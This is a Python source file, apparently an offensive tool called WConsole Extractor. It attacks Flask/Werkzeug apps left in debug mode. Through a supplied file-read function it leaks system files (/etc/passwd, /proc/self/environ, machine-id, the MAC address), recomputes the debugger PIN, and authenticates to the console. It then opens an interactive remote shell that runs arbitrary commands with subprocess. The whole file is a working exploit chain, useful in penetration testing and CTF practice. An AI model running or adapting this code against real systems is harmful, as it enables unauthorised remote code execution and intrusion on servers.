import html.entities
import requests
from urllib.parse import urlsplit, quote_plus
import re
import hashlib
from itertools import chain
from bs4 import BeautifulSoup as bs
import json
import html
from prompt_toolkit import PromptSession
from prompt_toolkit.shortcuts import clear
from rich import print as rprint

def error(message="", prefix=""):
    print(f"{prefix}[ERROR] {message}")
    exit(1)

def info(message="", prefix=""):
    print(f"{prefix}[INFO] {message}")

class WConsoleExtractor:
    etc_passwd_regex = re.compile(r"(.+):.*:.*:.*:.*:.*:.*")
    modname = "flask.app"
    class_name = "Flask"

    def __init__(self, target:str, leak_function, debugger_path:str="/console", no_colors=False):
        """
        Init WConsoleExtractor object
        target: the target url
        leak_function: a function that takes a filepath as parameter and returns its content
        debugger_path: the werkzeug console path, default is /console
        no_colors: disable colored output on debugger feature
        """
        self.target = target
        self.no_colors = no_colors
        if not callable(leak_function):
            error("Your leak function is not callable")

        self.leak_function = leak_function
        self.debugger_path = debugger_path

        # Get base url
        splitted = urlsplit(self.target)
        self.base_url = f"{splitted.scheme}://{splitted.netloc}"
        self.hostname = splitted.hostname

        # Initialize session
        self.sess = requests.Session()

        # Check website is up
        if not self.ping():
            error(f"{self.base_url} does not seem to be up, interrupting...")

        # Check Werkzeug
        server = self.check_werkzeug()
        if not server:
            error(f"Werkzeug not detected in {self.base_url}")

        # Check debug mode activated
        debug_mode, content = self.check_debug_mode()
        if not debug_mode:
            error(f"{self.base_url} does not seem to be in debug mode, interrupting...")

        # Check leak file function
        etc_passwd = self.leak_function("/etc/passwd")
        if not etc_passwd or not self.etc_passwd_regex.match(etc_passwd):
            error(f"Your leak function does not seem to work, here is the output when attempting to read /etc/passwd:\n{etc_passwd}")

        e = self.leak_function("/proc/self/environ")
        environ = WConsoleExtractor.parse_environ(e)
        self.username = self.get_username(environ)

        if not self.username:
            info("Unable to find username")
            self.username = self.choose_username(etc_passwd)

        self.python_version = self.get_version(r"Python", server)
        self.werkzeug_version = self.get_version(r"Werkzeug", server)

        self.flask_path = self.get_flask_path(WConsoleExtractor.get_venv(environ))

        if not self.flask_path:
            error("Unable to find flask package name, please report it (https://github.com/Ruulian/wconsole_extractor/issues)")

        self.probably_public_bits = [
            self.username,
            self.modname,
            self.class_name,
            self.flask_path
        ]

        # Private bits
        self.machine_id = self.get_machine_id()
        self.uuidnode = self.get_uuid_node()

        self.private_bits = [
            self.uuidnode,
            self.machine_id
        ]

        self.pin_code = self.compute_pin()
        self.token = self.get_token(content)

        if not self.authent():
            message = f"""The computed PIN CODE is wrong\n
            \rThis behavior can have multiple causes:
            \r    1. Your leak function is not accurate
            \r    2. The target can have an uuid.getnode() different from the mac address found in /sys/class/net/<device_id>/address
            \r    3. WConsole Extractor is not up to date or has an issue (please report on tool's repository)

            \rHere are the probably public bits:
            \r    {self.probably_public_bits}
            \rHere are the private bits:
            \r    {self.private_bits}"""
            error(message)

    @staticmethod
    def parse_environ(environ:str):
        l = environ.split("\0")[:-1]
        env = {}
        for v in l:
            matches = re.findall(r"(.+)=(.*)", v)
            if len(matches) == 0:
                error("Error while parsing environ")
            env[matches[0][0]] = matches[0][1]
        return env

    @staticmethod
    def get_venv(environ:dict) -> bool:
        return environ.get("VIRTUAL_ENV")

    @staticmethod
    def get_version(soft, server):
        version = re.findall(soft + r"\/(\d\.\d+)\..*", server)
        if len(version) == 0:
            error(f"{soft} version not found")
        return version[0].strip()

    @staticmethod
    def compare_versions(v1:str, v2:str):
        v1_split = v1.split(".")
        v2_split = v2.split(".")

        for i in range(3 - len(v1_split)):
            v1_split.append("0")

        for i in range(3 - len(v2_split)):
            v2_split.append("0")

        for i in range(3):
            diff = int(v1_split[i]) - int(v2_split[i])

            if diff > 0:
                return 1
            if diff < 0:
                return -1

        return 0

    @staticmethod
    def sanitize_output(output:str):
        return output.replace("\\n", "\n")[1:-1].strip()
    
    def get(self, path:str):
        return self.sess.get(f"{self.base_url}{path}")

    def get_headers(self):
        return self.get("/").headers

    def ping(self):
        try:
            r = self.get("/")
            return r.status_code
        except:
            return 0

    def check_debug_mode(self):
        r = self.get(self.debugger_path)
        return r.status_code == 200, r.text

    def check_werkzeug(self):
        headers = self.get_headers()
        return headers.get("Server")

    def print(self, message=""):
        print(message, end="")

    # Leaks
    def choose_username(self, etc_passwd:str):
        usernames = []
        for line in etc_passwd.splitlines():
            username = self.etc_passwd_regex.findall(line)[0]
            self.print(f"{len(usernames)} : {username}\n")
            usernames.append(username)

        answer = -1
        while answer < 0 or answer > len(usernames):
            try:
                answer = int(input("Choose the number corresponding to the user that (probably) launched the app > "))
            except ValueError:
                pass

        return usernames[answer]

    def get_username(self, environ:dict) -> str:
        for k, v in environ.items():
            if k == "USERNAME" or k == "USER" or k == "LOGNAME":
                return v

            # HOME variable -> parse home dirname
            if k == "HOME":
                if v.startswith("/home/"):
                    return v[6:]
                else:
                    return v[1:]

        return ""

    def get_flask_path(self, venv:str) -> str:
        base_version = self.python_version.rsplit(".", 1)[0]
        if venv:
            potential_paths = [
                # pythonX.X
                f"{venv}/lib/python{self.python_version}/site-packages/flask/app.py",
                f"{venv}/lib/python{self.python_version}/dist-packages/flask/app.py",

                # pythonX
                f"/proc/self/cwd/env/lib/python{base_version}/site-packages/flask/app.py",
                f"/proc/self/cwd/env/lib/python{base_version}/dist-packages/flask/app.py",
            ]
        else:
            home_dir = f"/home/{self.username}" if self.username != "root" else "/root"

            potential_paths = [
                # lib
                ## pythonX.X
                f"/usr/local/lib/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/local/lib/python{self.python_version}/dist-packages/flask/app.py",
                f"/usr/lib/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/lib/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{self.python_version}/site-packages/flask/app.py",

                ## pythonX
                f"/usr/local/lib/python{base_version}/site-packages/flask/app.py",
                f"/usr/local/lib/python{base_version}/dist-packages/flask/app.py",
                f"/usr/lib/python{base_version}/site-packages/flask/app.py",
                f"/usr/lib/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{base_version}/site-packages/flask/app.py",

                # lib64
                ## pythonX.X
                f"/usr/local/lib64/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/local/lib64/python{self.python_version}/dist-packages/flask/app.py",
                f"/usr/lib64/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/lib64/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{self.python_version}/site-packages/flask/app.py"

                ## pythonX
                f"/usr/local/lib64/python{base_version}/site-packages/flask/app.py",
                f"/usr/local/lib64/python{base_version}/dist-packages/flask/app.py",
                f"/usr/lib64/python{base_version}/site-packages/flask/app.py",
                f"/usr/lib64/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{base_version}/site-packages/flask/app.py",
            ]

        for path in potential_paths:
            r = self.leak_function(path)
            if r != "":
                return path

        return ""

    def get_machine_id(self):
        value = ""
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            content = self.leak_function(filename)
            if content == "": continue

            v = content.splitlines()[0].strip()

            if v:
                value += v
                break

        try:
            content2 = self.leak_function("/proc/self/cgroup")
            value += content2.splitlines()[0].strip().rpartition("/")[2]
        except IndexError:
            pass

        return value

    def get_uuid_node(self):
        net_dev = self.leak_function("/proc/net/dev")

        device_ids = re.findall(r"(\w+):", net_dev)
        # remove the loopback device
        if "lo" in device_ids:
            device_ids.remove("lo")

        if len(device_ids) == 0:
            error("Unable to find device id, no interfaces found")

        # https://github.com/python/cpython/blob/1b0e63c81b54a937b089fe335761cba4a96c8cdf/Lib/uuid.py#L642
        # Thus we first try to get the mac address of the first device alphabetically and then use the order of /proc/net/dev (which is the same as the order of ip link of _ip_getnode)
        first_device = sorted(device_ids)[0]
        device_ids.remove(first_device)
        device_ids.insert(0, first_device)

        for device_id in device_ids:
            mac = self.leak_function(f"/sys/class/net/{device_id}/address")

            matched = re.findall(r"[0-9a-f:]+", mac)

            if len(matched) > 0:
                uuid_node = str(int(matched[0].replace(":", ""), base=16))
                return uuid_node
        
        error(f"Unable to find uuid node, no valid mac address found in {device_ids}")

    def compute_pin(self):
        is_v2 = WConsoleExtractor.compare_versions(self.werkzeug_version, "2.0.0") >= 0

        if is_v2:
            h = hashlib.sha1()
        else:
            h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0

        for bit in chain(self.probably_public_bits, self.private_bits):
            if not bit:
                continue
            if isinstance(bit, str):
                bit = bit.encode('utf-8')
            h.update(bit)
        h.update(b'cookiesalt')
        #h.update(b'shittysalt')

        cookie_name = '__wzd' + h.hexdigest()[:20]

        num = None
        if num is None:
            h.update(b'pinsalt')
            num = ('%09d' % int(h.hexdigest(), 16))[:9]

        rv =None
        if rv is None:
            for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                    rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                  for x in range(0, len(num), group_size))
                    break
            else:
                rv = num

        return rv

    def get_token(self, token_request_content):
        token = re.findall(r'SECRET = "(.+)";', token_request_content)

        if len(token) == 0:
            error("Error while finding token")

        return token[0]

    def authent(self):
        authent_path = f"/?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
        r = self.get(authent_path)

        try:
            state = json.loads(r.text)
        except:
            error("Error during authentication")
        return state["auth"]
    
    def parse_html(self, content:str) -> tuple[str, bool]:
        try:
            soup = bs(content, "html.parser")
            traceback = soup.find("div", attrs={"class":"traceback"})

            if traceback:
                if "noframe-traceback" in traceback.attrs["class"]:
                    err = traceback.find("pre")
                else:
                    err = traceback.find("blockquote")
            
                if not err:
                    error("Unhandled error, please report the issue on tool's repository")
                
                output = "".join(err.contents)
            else:
                span = soup.find("span")

                if span:
                    extended = span.find("span", attrs={"class":"extended"})

                    output = span.contents[0]

                    if extended:
                        output += extended.contents[0]
                else:
                    output = soup.contents[0].splitlines()[1]

        except Exception as e:
            error(e)
        
        return output.strip(), traceback is not None
    
    def exec_console(self, code:str):
        self.authent()
        return self.get(f"{self.debugger_path}?__debugger__=yes&cmd={quote_plus(code)}&frm=0&s={self.token}")

    def exec_cmd(self, cmd:str):
        argv = cmd.split(' ')
        self.authent()

        payload = f"import subprocess;subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()[0].decode()"
        url = f"/console?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
        res = self.get(url)

        if res.status_code == 404:
            error("Error while sending command, please report the issue on tool's repository")
            return

        output, err = self.parse_html(res.text)
        
        if err:
            return output
        
        return WConsoleExtractor.sanitize_output(output)
    
    def exec_dbg(self, code:str):
        res = self.exec_console(code)

        if res.status_code == 404:
            error("Error while evaluating code, please report the issue on tool's repository")
            return
        
        output, _ = self.parse_html(res.text)
        return output
    
    def shell(self):
        switch_commands = ["shell", "debug"]
        exit_commands = ["exit", "quit", "q"]
        clear_commands = ["clear", "c"]
        session = PromptSession()

        while True:
            try:
                cmd = session.prompt("[SHELL] > ")
                if cmd in exit_commands:
                    raise SystemExit
                if cmd in clear_commands:
                    clear()
                    continue
                if cmd.strip() in switch_commands:
                    self.debugger()
                    break
            except (KeyboardInterrupt, EOFError, SystemExit,IndexError):
                break
            else:
                output = self.exec_cmd(cmd)
                if output.startswith("FileNotFoundError"):
                    output = f"{cmd}: command not found"
                self.print(f"{output}\n")
        info("Shell Terminated")

    def debugger(self):
        switch_commands = ["shell", "debug"]
        exit_commands = ["exit", "quit", "q"]
        clear_commands = ["clear", "c"]
        session = PromptSession()

        while True:
            try:
                code = session.prompt("[DEBUGGER] > ")
                if code in exit_commands:
                    raise SystemExit
                if code.strip() in clear_commands:
                    clear()
                    continue
                if code.strip() in switch_commands:
                    self.shell()
                    exit()
            except (KeyboardInterrupt, EOFError, SystemExit):
                break
            else:
                try:
                    output = self.exec_dbg(code)
                except Exception as e:
                    output = str(e)
                rprint(f"{output}")
        info("Debugger Terminated")
